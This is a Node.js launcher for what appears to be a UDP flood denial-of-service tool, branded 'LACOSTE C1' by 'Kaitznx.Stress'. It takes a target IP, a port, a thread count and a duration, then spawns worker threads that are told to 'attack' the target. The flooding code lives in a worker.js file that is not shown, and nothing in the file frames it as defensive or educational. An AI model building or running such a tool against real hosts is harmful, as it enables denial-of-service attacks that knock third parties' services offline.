const { Worker } = require('worker_threads');

console.log('\x1b[31m%s\x1b[0m', `
            
██╗░░░░░░█████╗░░█████╗░░█████╗░░██████╗████████╗███████╗
██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝
██║░░░░░███████║██║░░╚═╝██║░░██║╚█████╗░░░░██║░░░█████╗░░
██║░░░░░██╔══██║██║░░██╗██║░░██║░╚═══██╗░░░██║░░░██╔══╝░░
███████╗██║░░██║╚█████╔╝╚█████╔╝██████╔╝░░░██║░░░███████╗
╚══════╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝

░█████╗░░░███╗░░
██╔══██╗░████║░░
██║░░╚═╝██╔██║░░
██║░░██╗╚═╝██║░░
╚█████╔╝███████╗
░╚════╝░╚══════╝
            
                  [by Kaitznx.Stress]

                  [developer] Saturn.Stress
     
█░░ ▄▀█ █▀▀ █▀█ █▀ ▀█▀ █▀▀   █▀▀ ▄█
█▄▄ █▀█ █▄▄ █▄█ ▄█ ░█░ ██▄   █▄▄ ░█
`);
const [node, dir, address, port, threads = 4, time = 5] = process.argv;

if (!address || !port) {
  return console.log('\x1b[31m%s\x1b[0m', '[ERROR] Use: \'node . <ip> <port> [<Packets> (default 4)] [<tiempo> (in minutos)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log('\x1b[31m%s\x1b[0m', `[udpps] cargando en la linea de attacks #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log('\x1b[31m%s\x1b[0m', "[udpps] la linea de attacks comienza en 3s...")